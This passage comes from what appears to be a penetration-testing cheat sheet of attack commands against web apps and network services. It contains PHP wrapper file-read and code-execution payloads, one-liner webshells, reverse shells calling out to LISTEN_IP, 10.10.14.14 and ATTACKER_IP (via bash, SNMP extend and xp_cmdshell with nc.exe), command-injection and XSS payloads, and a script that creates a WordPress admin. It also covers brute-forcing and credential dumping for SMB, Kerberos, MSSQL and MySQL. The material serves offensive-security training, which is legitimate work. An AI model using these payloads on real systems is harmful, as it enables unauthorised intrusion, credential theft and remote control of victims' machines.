Using [`filter`](https://www.php.net/manual/en/filters.php) [wrapper](https://www.php.net/manual/en/wrappers.php.php) to grab local files:

```sh
# filter without any processing to grab plaintext:
php://filter/resource=/path/to/flle
# Example:
curl http://example.com/index.php?page=php://filter/resource=/etc/passwd


# base64 encode file before grabbing (helps grab php source or binary files)
# available starting with PHP 5.0.0
php://filter/convert.base64-encode/resource=/path/to/file
# Example:
curl http://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php


# ROT13 encode file:
php://filter/read=string.rot13/resource=/etc/passwd

# chaining multiple filters with "|":
php://filter/string.toupper|string.rot13/resource=/path/to/file

# list of useful filters:
# https://www.php.net/manual/en/filters.php
string.toupper
string.tolower
string.rot13
convert.base64-encode
convert.base64-decode
zlib.deflate  # i.e. gzip, without headers/trailers
zlib.inflate  # i.e. gunzip
bzip2.compress
bzip2.decompress
```

Code execution with `expect`, `data`, and `input` wrappers:

```sh
# run commands directly if 'expect' extension installed (not default):
expect://whoami

# inject arbitrary string into the file if 'allow_url_include' setting is enabled.
# can be used for code execution, XSS, etc.:
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+  # injects "<?php phpinfo();?>"

# When injecting php code, a good way to test code execution is with:
<?php phpinfo();?>

# use "data:" to inject executable php code directly into the URL
data:text/plain,<?php phpinfo(); ?>
data:,<?system($_GET['x']);?>&x=ls
data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls

# Use 'php://input' as the query param's value to tell it to look at the POST
# request body for the text to insert there. Useful for injecting complex
# php payloads
php://input
# example POST body: <?php system('whoami'); ?>

# FILTER BYPASSES:
# Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto
# a file path by injecting a NULL byte. E.g.:
?page=../../../etc/passwd%00
# You can take this technique further and URL-encode the entire php://filter
# directive to hopefully bypass server-side filters on it. Or even double-URL-
# encode the string.
# Also try bypassing filters with ....// instead of ../
```


#### 2.6.5.2 One-liner PHP Webshells

Simple one-liner web shells for when you can drop/modify a php file:

```php
<?php system($_GET['cmd']); ?>

<?php echo exec($_POST['cmd']); ?>

<?php echo shell_exec($_REQUEST['cmd']); ?>

<?php echo passthru($_GET['cmd']); ?>
```

Kali has more webshells here: `/usr/share/webshells/php/`, and I have some in the [tools](tools) directory

[One-liner PHP reverse shell](#54-reverse-shells):

```php
<?php $sock=fsockopen("LISTEN_IP",443);exec("/bin/bash -i <&3 >&3 2>&3"); ?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'"); ?>
```

[Great collection of PHP webshells and reverse shells](https://github.com/ivan-sincek/php-reverse-shell)

[Pentestmonkey PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)



### 2.6.6 Command Injection

Some websites pass user input to a shell execution environment (probably with some filtering).
If you can bypass the filter, you get code execution!

Tips:
- `whoami` runs on both Windows and Linux hosts. Good candidate for test injection.
- prefix command with separator characters: `; | & || &&`
- try url-encoded separators:
  - `%0A`: newline
  - `%3B`: semicolon
- May need to terminate quoted context before starting your command:
  ```sh
  '; whoami
  "&& whoami
  "& whoami"  # surrounding with quotes
  ```
- surrounding your command with UNIX subshells for execution:
  ```sh
  $(whoami)
  >(whoami)
  `whoami`
  ```
- To see if you're executing in CMD or Powershell (will print which one):
  ```powershell
  (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
  ```
- try seeing if you can get a help msg:  `-h`, `--help`, `/?`
- maybe redirection provides useful info `< /etc/passwd`
- perl injection when opening file:  `echo Injected|`
- if you can't see output of command, try time-based character-by-character extraction:
  ```sh
  time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  ```
- if bash restrictions (filtering what commands are executed), see [bypass guide](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions).


Here are common URL query params (or form fields) that may be vulnerable to injection:

```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```



### 2.6.7 Cross-Site Scripting (XSS)

In all input fields, URL query parameters, and HTTP request headers that get transformed into page content, try the following:

- [ ] Check what remains after any filtering is applied on input: `'';!--"<XSS>=&{()}`
- [ ] Try variations of `<script>alert(1)</script>`



If you can get XSS working, consider possible vectors, especially against admin users:

- [ ] Steal cookies, authentication (OAuth) tokens, and other sensitive data
- [ ] Key-log password entry on login page
- [ ] Perform Cross-Site Request Forgery (CSRF) using victim's/Admin's session (may need to steal token/nonce). Maybe create a new admin user or change admin password?



When injecting XSS javascript payload, you may may want to ensure no characters get filtered. An easy way to ensure that is to encode the payload as Unicode code points.

```javascript
// Use the following code in your browser's console to encode the payload as Unicode code points.
function encode_javascript(minified_js) {
	return [...minified_js].map(function (c) { return c.codePointAt(0); }).join(",")
}
let encoded = encode_javascript("insert_minified_javascript") // replace with your payload
console.log(encoded)
```

Once the payload is encoded, insert the resulting array of integers into the following injected XSS script tag:

```html
<!-- replace digits with output from previous encoder -->
<script>eval(String.fromCodePoint(97,108,101,114,116,40,39,128526,39,41))</script>
<!-- example is code for "alert('😎')" -->
```



Here is an example script payload that creates an admin user on a vulnerable WordPress site by exploiting the vulnerable User-Agent header:

```javascript
// Collect WordPress nonce from admin user
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Create new admin account
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=derp&email=derp@derp.com&pass1=herpderp&pass2=herpderp&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```



### 2.6.8 WordPress

```sh
wpscan --update -o wp-scan.txt --url http://$VICTIM_IP/

# --enumerate options:
# p = Popular plugins
# vp = Vulnerable plugins
# ap = All plugins (takes a while)
# t = Popular themes
# vt = Vulnerable themes
# at = All themes (takes a while)
# cb = Config backups
# tt = Timthumbs
# dbe = Db exports
# u = usernames w/ ids 1-10
# m = media IDs 1-10
# NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m

# other useful flags:
# --login-uri URI
#     The URI of the login page if different from /wp-login.php
# --random-user-agent, --rua
#     Be a bit more stealthy
# --update
#     update the WPScan database before scanning

# username / password bruteforce possible
# -U, --usernames LIST
#     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt
#     Will auto-enum users if -U not supplied
# -P, --passwords FILE-PATH
#     path to password file for brute force

# aggressive scan:
wpscan --update \
       --random-user-agent \
       --enumerate ap,at,cb,dbe,u \
       --detection-mode aggressive \
       --plugins-detection aggressive \
       --plugins-version-detection aggressive \
       --url http://$VICTIM_IP/

# scan with cmsmap (https://github.com/Dionach/CMSmap):
cmsmap -o cmsmap.txt -d http://$VICTIM_IP
```

Also try logging into the Wordpress admin page (`/wp-admin`).

If you can log in, you can update the page template to get code execution. Appearance → Editor → 404 Template (at the right), add a PHP shell.

After admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. Remember to activate plugin after install.

[WordPress Plugin Webshell](https://github.com/p0dalirius/Wordpress-webshell-plugin) - accessible via `/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=id`

Maybe upload Media file that has PHP script?

Post exploit: The `wp-config.php` file contains information required by WordPress to connect to the database (credentials).

```bash
# Extract usernames and passwords:
mysql -u USERNAME --password=PASSWORD -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```

Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) for more.


### 2.6.9 Drupal

```sh
droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
```



### 2.6.10 Joomla

```sh
joomscan --ec -u $VICTIM_IP # if joomla found
```



## 2.7 Kerberos - 88,749

```sh
# username enumeration with Kerbrute
./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt

# dump all LDAP users
impacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld/
impacket-GetADUsers -all -dc-ip DC_IP DOMAIN.tld/user:password

# ASREPRoasting - Kerberos attack that allows password hashes to be retrieved
# for users that do not require pre-authentication (user has “Do not use
# Kerberos pre-authentication” enabled).
# Find ASREPRoastable users and password hashes (slash after domain required)
impacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/
# be sure to crack the hashes to retrieve the passwords
hashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force

# alternate method (done locally on windows box):
# uses: https://github.com/GhostPack/Rubeus
Rubeus.exe asreproast /format:john /outfile:hash.txt

# list SMB shares with hash of asreproasted user
smbclient '\\VICTIM_IP\sharename' -L DC_IP -W DOMAIN -U username%NTHASH --pw-nt-hash
```



## 2.8 POP - 110,995

Post Office Protocol (POP) retrieves email from a remote mail server.

```sh
# banner grabbing
nc -nvC $VICTIM_IP 110
openssl s_client -connect $VICTIM_IP:995 -crlf -quiet

# basic scan
nmap -n -v -p110 -sV --script="pop3-* and safe" -oA nmap/pop3 $VICTIM_IP

# Bruteforcing
hydra -V -f -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $VICTIM_IP pop3
hydra -V -f -S -l USERNAME -P /path/to/passwords.txt -s 995 $VICTIM_IP pop3

# user enum / log in
nc -nvC $VICTIM_IP 110  # "-C" for \r\n line endings, required
telnet $VICTIM_IP 110   # alternate method
USER username
PASS password
LIST # gets list of emails and sizes
RETR 1 # retrieve first email
# try real (root) and fake users to see if there is a difference in error msgs
```



## 2.9 RPCbind - 111

Gets you list of ports open using RPC services. Can be used to locate NFS
or rusersd services to pentest next.

```sh
# banner grab
nc -nv $VICTIM_IP 111

# list short summary of rpc services
rpcinfo -s $VICTIM_IP
# list ports of rpc services
rpcinfo -p $VICTIM_IP

# try connecting with null session
rpcclient -U "" $VICTIM_IP
rpcclient $> enumdomusers
rpcclient $> queryuser 0xrid_ID
# see MSRPC (port 135) for more commands
```



## 2.10 NNTP - 119

Network News Transfer Protocol, allows clients to retrieve (read) and post
(write) news articles to the NNTP (Usenet) server.

```sh
# banner grab, interact/view articles
nc -nvC $VICTIM_IP 119   # "-C" required for \r\n line endings
HELP  # list help on commands (not always available)
LIST  # list newsgroups, with 1st and last article numbers in each group
GROUP newsgroup.name  # select the desired newsgroup to access (e.g. "net.news")
LAST  # view last article in newsgroup
ARTICLE msgID   # view article by ID
NEXT  # go to next article
QUIT
# http://www.tcpipguide.com/free/t_NNTPCommands-2.htm
# https://tools.ietf.org/html/rfc977
```



## 2.11 MSRPC and NetBIOS - 135,137,139

Port 135 is MSRPC. Port 139 is NetBIOS (legacy: 137, 138?), which is tied to SMB for backwards compatibility of session management and name services.

```sh
# see the services available through MSRPC
impacket-rpcdump $VICTIM_IP | tee rpcdump.log
# lsa/samr ones let you enumerate users

# interact with MSRPC
# via null session:
rpcclient $VICTIM_IP -U "" -N
# authenticated:
rpcclient $VICTIM_IP -W DOMAIN -U username -P password
# from here can enumerate users, groups, etc.
# (netshareenum, lookupnames, lookupsids, enumdomusers, ...)
srvinfo           # query server info
querydispinfo     # list users
enumdomusers      # list users
enumdomgroups     # list groups
enumdomains       # list domains
querydominfo      # domain info
lsaquery          # get SIDs
lsaenumsid        # get SIDs
lookupsids <sid>  # lookup SID
```

Users enumeration

- **List users**: `querydispinfo` and `enumdomusers`
- **Get user details**: `queryuser <0xrid>`
- **Get user groups**: `queryusergroups <0xrid>`
- **GET SID of a user**: `lookupnames <username>`
- **Get users aliases**: `queryuseraliases [builtin|domain] <sid>`

Groups enumeration

- **List groups**: `enumdomgroups`
- **Get group details**: `querygroup <0xrid>`
- **Get group members**: `querygroupmem <0xrid>`

Aliasgroups enumeration

- **List alias**: `enumalsgroups <builtin|domain>`
- **Get members**: `queryaliasmem builtin|domain <0xrid>`

Domains enumeration

- **List domains**: `enumdomains`
- **Get SID**: `lsaquery`
- **Domain info**: `querydominfo`

More SIDs

- **Find SIDs by name**: `lookupnames <username>`
- **Find more SIDs**: `lsaenumsid`
- **RID cycling (check more SIDs)**: `lookupsids <sid>`

```bash
# dump user information
# can also add creds: [[domain/]username[:password]@]<VictimIP>
impacket-samrdump -port 139 $VICTIM_IP
```



## 2.12 SMB - 445

Port 445 is Server Message Block (SMB).

Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups, shares, etc.)

Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smb)

SMB Scans:

```sh
# get netbios names of computers, and usernames
crackmapexec smb VICTIM_IP/24
sudo nbtscan -r $VICTIM_IP/24 # force port 137, which Win95 hosts need to respond
nbtscan $VICTIM_IP/24

# check null sessions
crackmapexec smb VICTIM_IP/24 -u '' -p ''

# check guest login
crackmapexec smb VICTIM_IP/24 -u 'guest' -p ''

# enumerate hosts with SMB signing not required
crackmapexec smb VICTIM_IP/24 --gen-relay-list ntlm-relayers.txt

# list shares
smbmap -H $VICTIM_IP
# try with '-u guest' if getting "[!] Authentication error"
# try with '-u null -p null'

# list (only) windows version
smbmap -vH $VICTIM_IP

# recursively list directory contents
smbmap -R -H $VICTIM_IP

# basic scan, enum4linux
enum4linux $VICTIM_IP

# scan all the things
enum4linux -aMld $VICTIM_IP | tee enum4linux.log
# try with guest user if getting nothing via null session:
enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
# may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)

# nmap script scans
nmap --script="safe and smb-*" -n -v -p 139,445 $VICTIM_IP
```

Listing SMB Shares:

```bash
# enumerate readable/writable shares on multiple IPs with/without credentials
crackmapexec smb VICTIM_IPS -u USERNAME -p 'PASSWORD' --shares --filter-shares READ WRITE

# list available shares using smbmap (no creds)
smbmap -H $VICTIM_IP

# List shares using smbclient (no creds)
smbclient -N -L $VICTIM_IP

# Enumerate shares you have creds for
# Can provide password after '%' with smbclient;
# will prompt for password if omitted.
smbclient -L $VICTIM_IP -W DOMAIN -U 'username[%password]'

# Use  -c 'recurse;ls'  to list dirs recursively with smbclient
# With --pw-nt-hash, the password is provided in NT hash form
smbclient -U 'username%NTHASH' --pw-nt-hash -c 'recurse;ls' //$VICTIM_IP

# List with smbmap, without SHARENAME it lists everything
smbmap [-u "username" -p "password"] -R [SHARENAME] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [SHARENAME] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<LM>:<NT>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pass-the-Hash
```

Listing SMB Shares from Windows:

```powershell
# view shares on local host
net share

# /all lets us see administrative shares (ending in '$').
# Can use IP or hostname to specify host.
net view \\VICTIM /all
```

Common shares for Windows:

- C$ - maps to C:/
- ADMIN$ - maps to C:/Windows
- IPC$ - used for RPC
- Print$ - hosts drivers for shared printers
- SYSVOL - only on DCs
- NETLOGON - only on DCs

**NOTE:** In recent versions of Kali, when connecting with `smbclient`, you might see an error message like:

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

This is due to the fact that NTLMv1 (insecure) protocol was disabled by default. You can turn it back on by adding the following settings under `GLOBAL` in `/etc/samba/smb.conf`

```
client min protocol = CORE
client max protocol = SMB3
```

Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`

### 2.12.1 SMB Credential Bruteforcing

```sh
nmap --script smb-brute -p 445 $VICTIM_IP
hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
```

### 2.12.2 Interacting with SMB

```sh
# tar all files [under a directory (no trailing slash on path)]
smbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]

# recursively get all files (interactive session)
smbclient //$VICTIM_IP/SHARENAME
> mask "" # don't filter any file names
> recurse on # recursively execute commands
> prompt off # don't prompt for file names
> mget * # copy all files matching mask to host

# Interactive smb shell with creds
smbclient '\\VICTIM_IP\sharename' -W DOMAIN -U username[%password]
# add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)
smbclient '\\VICTIM_IP\sharename' -W DOMAIN -U username%NTHASH --pw-nt-hash

smb:\> help  # displays commands to use
smb:\> ls  # list files
smb:\> get filename.txt  # fetch a file

# mount smb share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share

# try executing a command using wmi (can try psexec by adding '--mode psexec')
smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
```



## 2.13 SNMP(s) - 161,162,10161,10162

Simple Network Management Protocol (SNMP), runs on UDP 161 and 162 (trap). The secure version (using TLS) is on 10161 and 10162.

Before getting started, install the MIBs:

```sh
sudo apt install -y snmp snmp-mibs-downloader
sudo download-mibs
```

For resolving further issues with MIBs, see [Using and loading MIBs](https://net-snmp.sourceforge.io/wiki/index.php/TUT:Using_and_loading_MIBS)

Basic SNMP enumeration:

```sh
# nmap snmp scan
nmap --script "snmp* and not snmp-brute" $VICTIM_IP

# quick bruteforce snmp community strings with onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $VICTIM_IP -w 100

# extended bruteforce snmp community strings with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v $VICTIM_IP snmp

# comprehensive enumeration (system/network/process/software info)
snmp-check $VICTIM_IP

# basic enumeration with onesixtyone, using default 'public' community string
onesixtyone $VICTIM_IP public

# getting system description (like uname -a on Linux systems)
snmpwalk -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr
snmpget -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr.0

snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.4.1.77.1.2.25 # users
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.4.2.1.2 # processes
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.6.13.1.3 # ports
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.6.3.1.2 # software
snmpwalk -c public -v2c $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName # software

# get ALL info available on SNMP
snmpwalk -v2c -c public $VICTIM_IP
```

Useful SNMP OIDs:

| OID Value              | Info Provided    |
| ---------------------- | ---------------- |
| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports  |

Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from SNMP:

- Email addresses
- SNMP community strings
- Password hashes
- Clear text passwords

Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/basic-search.htm)

**SNMP config files:** (may contain sensitive data)

- Typical locations:
  - `/etc/`
  - `/etc/snmp/`
  - `~/.snmp/`
- Common filenames:
  - snmp.conf
  - snmpd.conf
  - snmp-config.xml

### 2.13.1 Exploring MIBs with `snmptranslate`

From the [`snmptranslate` Tutorial](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):

```sh
# look up numeric OID to get abbreviated name
snmptranslate .1.3.6.1.2.1.1.3.0
snmptranslate -m +ALL .1.3.6.1.2.1.1.3.0

# look up OID node name without fully-qualified path (random access)
snmptranslate -IR sysUpTime.0

# convert abbreviated OID to numeric (dotted-decimal)
snmptranslate -On SNMPv2-MIB::sysDescr.0

# convert abbreviated OID to dotted-text
snmptranslate -Of SNMPv2-MIB::sysDescr.0
# convert numeric (dotted-decimal) to dotted-text
snmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0

# get description/extended info about OID node
snmptranslate -Td SNMPv2-MIB::sysDescr.0
# same for numeric
snmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0

# get tree view of subset of MIB tree
snmptranslate -Tp -IR system

# look up OID by regex (best match)
snmptranslate -Ib 'sys.*ime'

#  To get a list of all the nodes that match a given pattern, use the -TB flag:
snmptranslate -TB 'vacm.*table'

# find out what directories are searched for MIBS:
net-snmp-config --default-mibdirs # only if installed
snmptranslate -Dinit_mib .1.3 |& grep MIBDIR
```

When using the `-m +ALL` argument, I got the error:

```
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
```

There is a typo in the file that gets pulled by `snmp-mibs-downloader`. The fix is to replace the existing file with a corrected version, which is located [here](http://pastebin.com/raw/p3QyuXzZ).

### 2.13.2 RCE with SNMP

See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)

Easy library to do this: [https://github.com/mxrch/snmp-shell.git](https://github.com/mxrch/snmp-shell.git)

```sh
# manually create reverse shell (update listener IP)
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/env 'nsExtendArgs."derp"' = 'python -c "import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"'

# trigger reverse shell by reading the OID
snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects

# delete the reverse shell command from the SNMP table
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = destroy
```

This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)



## 2.14 LDAP(s) - 389,636

TODO



## 2.15 MSSQL - 1443

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).

```sh
# check for known vulns
searchsploit "microsoft sql server"

# if you know nothing about it, try 'sa' user w/o password:
nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP
# if you don't have creds, you can try to guess them, but be careful not to block
# accounts with too many bad guesses
```

See [MSSql Interaction](#4142-mssql-interaction) for how to connect, interact.

**Post-Exploit PrivEsc**

The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)

### 2.15.1 MSSQL Credential Bruteforcing

```sh
# Be carefull with the number of password in the list, this could lock-out accounts
# Use the NetBIOS name of the machine as domain, if needed
crackmapexec mssql -d DOMAINNAME -u usernames.txt -p passwords.txt $VICTIM_IP
hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
```

More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

### 2.15.2 MSSQL Interaction

**Connecting to the MSSQL server**

From kali, for interactive session:

```sh
# simplest tool for interactive MSSQL session
impacket-mssqlclient USERNAME:PASSWORD@VICTIM_IP -windows-auth
# requires double quotes for xp_cmdshell strings

# alternative option, can use single quotes for xp_cmdshell strings
sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
```

From Windows:

```bat
sqlcmd -S SERVER -l 30
sqlcmd -S SERVER -U USERNAME -P PASSWORD -l 30
```

**Useful commands:**

```sql
-- show username
select user_name();
select current_user;  -- alternate way

-- show server version
select @@version;

-- get server name
select @@servername;

-- show list of databases ("master." is optional)
select name from master.sys.databases;
exec sp_databases;  -- alternate way
-- note: built-in databases are master, tempdb, model, and msdb
-- you can exclude them to show only user-created databases like so:
select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');

-- use database
use master

-- getting table names from a specific database:
select table_name from somedatabase.information_schema.tables;

-- getting column names from a specific table:
select column_name from somedatabase.information_schema.columns where table_name='sometable';

-- get credentials for 'sa' login user:
select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;

-- get credentials from offsec database (using 'dbo' table schema) user table
select * from offsec.dbo.users;

-- error/boolean-based blind injection
' AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #

-- time-based blind injection
' WAITFOR DELAY '0:0:3'; -- #
```

References:
- [PentestMonkey MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [PayloadsAllTheThings - MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
- [HackTricks - Pentesting MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

### 2.15.3 MSSQL Command Execution

Simple command execution:

```bash
# Username + Password + CMD command
crackmapexec mssql -d DOMAIN -u USERNAME -p PASSWORD -x "whoami" $VICTIM_IP
# Username + Hash + PS command
crackmapexec mssql -d DOMAIN -u USERNAME -H HASH -X '$PSVersionTable' $VICTIM_IP
```

Using interactive session:

```sql
-- Check if you have server admin rights to enable command execution:
-- Returns 1 if admin
select is_srvrolemember('sysadmin');
go

-- Check if already enabled
-- check if xp_cmdshell is enabled
select convert(int, isnull(value, value_in_use)) as cmdshell_enabled from sys.configurations where name = n'xp_cmdshell';
go

-- turn on advanced options; needed to configure xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
go

-- enable xp_cmdshell
exec sp_configure 'xp_cmdshell', 1;RECONFIGURE;
go

-- Quickly check what the service account is via xp_cmdshell
EXEC xp_cmdshell 'whoami';
go
-- can be shortened to just: xp_cmdshell 'whoami.exe';
-- long form: EXEC master..xp_cmdshell 'dir *.exe'

-- Bypass blackisted "EXEC xp_cmdshell"
DECLARE @x AS VARCHAR(50)='xp_cmdshell'; EXEC @x 'whoami' —

-- Get netcat reverse shell
xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
go
xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
go
```



## 2.16 NFS - 2049

[HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)

```sh
# scan with scripts
nmap -n -v -p 2049 -sV --script="safe and nfs-*" -oA nmap/nfs-scripts $VICTIM_IP

# list all mountpoints
showmount -a $VICTIM_IP
# list all directories
showmount -d $VICTIM_IP
# list all exports (remote folders you can mount)
showmount -e $VICTIM_IP

# the exports are also in /etc/exports
# look for exports with no_root_squash/no_all_squash setting for privesc
# https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

# Mounting an exported share:
# mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# use version 2 because it doesn't have any authentication or authorization
# if mount fails, try without vers=2
# dir may need "/"prefix
# dir is one of showmount -e results (from /etc/exports)
mkdir nfs && \
sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs

# create user with specific UID to be able to read files on your kali box
# "-s" login shell, "-M" no create home
sudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser
# removing user when done:
sudo deluser --remove-home tempuser && sudo groupdel tempuser
# or just switch to root to read nearly everything:
sudo su
# if needing a specific group:
sudo groupadd -g 1010 tempgroup
sudo usermod -a -G tempgroup tempuser
```

See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)



## 2.17 MySQL - 3306

MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when running `netstat -tnl`.

Logging in:

```sh
## Locally:
# as root without password (if allowed)
mysql -u root
# same, but prompt for password
mysql -u root -p
# provide password
mysql -u root -p'root'

## Remotely:
mysql -u root -h HOSTNAME
```

Once logged in, check out the schema and environment:

```sql
-- show list of databases
show databases;
-- Set current database to mysql
use mysql;
-- show tables in current database
show tables;
-- describe the table schema for 'user' table
describe user;
select table_name,column_name,table_schema from information_schema.columns where table_schema=database();

-- show MySQL version (both versions work)
select version();
select @@version;
-- show logged-in user
select user();
select system_user();
-- show active database
select database();
show databases;
-- show system architecture
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
-- show plugin directory (for UDF exploit)
select @@plugin_dir;
show variables like 'plugin%';

-- Try to execute code (try all ways)
\! id
select sys_exec('id');
select do_system('id');

-- Try to read files
select load_file('/etc/passwd');
-- more complex method
create table if not exists test (entry TEXT);
load data local infile "/etc/passwd" into table test fields terminated by '\n';
select * from test;
-- show file privileges of 'test' user
select user,file_priv from mysql.user where user='test';
-- show all privs of current user
select * from mysql.user where user = substring_index(user(), '@', 1) ;

-- Look at passwords
-- MySQL 5.6 and below
select host, user, password from mysql.user;
-- MySQL 5.7 and above
select host, user, authentication_string from mysql.user;

-- add new user with full privileges
create user test identified by 'test';
